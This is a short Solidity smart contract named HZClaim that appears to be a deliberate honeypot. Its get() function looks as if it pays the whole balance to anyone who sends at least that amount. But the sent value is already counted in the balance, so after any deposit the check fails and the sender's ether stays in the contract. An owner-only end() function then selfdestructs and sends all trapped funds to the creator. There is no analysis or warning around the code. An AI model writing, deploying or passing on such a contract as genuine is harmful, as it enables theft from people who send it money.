pragma solidity ^0.4.25;

contract HZClaim
{
    constructor() public payable {
        org = msg.sender;
    }
    function() external payable {}
    address org;
    function end() public {
        if (msg.sender==org)
            selfdestruct(msg.sender);
    }
    function get() public payable {
        if (msg.value >= address(this).balance)
            msg.sender.transfer(address(this).balance);
    }
}